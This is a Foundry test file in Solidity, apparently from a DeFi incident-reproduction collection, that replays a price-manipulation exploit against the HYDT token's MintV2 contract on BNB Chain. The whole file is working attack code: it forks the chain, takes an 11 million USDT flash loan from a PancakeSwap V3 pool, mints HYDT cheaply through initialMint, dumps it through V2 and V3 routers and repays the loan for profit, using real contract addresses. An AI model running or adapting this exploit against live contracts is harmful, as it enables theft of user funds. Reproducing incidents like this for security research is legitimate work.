// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : price manipulation,mintv2 use wbnb-usdt pair price to mint Token
// guy    : https://x.com/TenArmorAlert/status/1844241843518951451
// tx     : https://app.blocksec.com/explorer/tx/bsc/0xa9df1bd97cf6d4d1d58d3adfbdde719e46a1548db724c2e76b4cd4c3222f22b3?line=58
// total loss : 5.8kusdt

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5E901164858d75852EF548B3729f44Dd93209c9c);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V3 routerV3 = Uni_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);
    uint256 borrow_amount;
    address MintV2 = 0xA2268Fcc2FE7A2Bb755FbE5A7B3Ac346ddFeDB9B;

    function setUp() external {
        cheats.createSelectFork("bsc", 42_985_310);
        deal(address(USDT), address(this), 0);
        // deal(address(WBNB), address(this), 11 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        borrow_amount = 11_000_000 ether;
        pool.flash(address(this), borrow_amount, 0, "");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        console.log("pancakeV3FlashCallback");
        console.log(USDT.balanceOf(address(this)));
        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
        WBNB.withdraw(11 ether);
        (bool success,) = MintV2.call{value: 11 ether}(abi.encodeWithSignature("initialMint()"));
        uint256 v3_amount = HYDT.balanceOf(address(this)) / 2;
        HYDT.approve(address(routerV3), v3_amount);
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(HYDT),
            tokenOut: address(USDT),
            deadline: type(uint256).max,
            recipient: address(this),
            amountIn: v3_amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0,
            fee: 500
        });
        routerV3.exactInputSingle(_Params);
        swap_token_to_token(address(HYDT), address(WBNB), HYDT.balanceOf(address(this)) / 2);
        swap_token_to_token(address(HYDT), address(USDT), HYDT.balanceOf(address(this)));
        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)));
        USDT.transfer(address(pool), borrow_amount + fee0);
        console.log(fee0);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
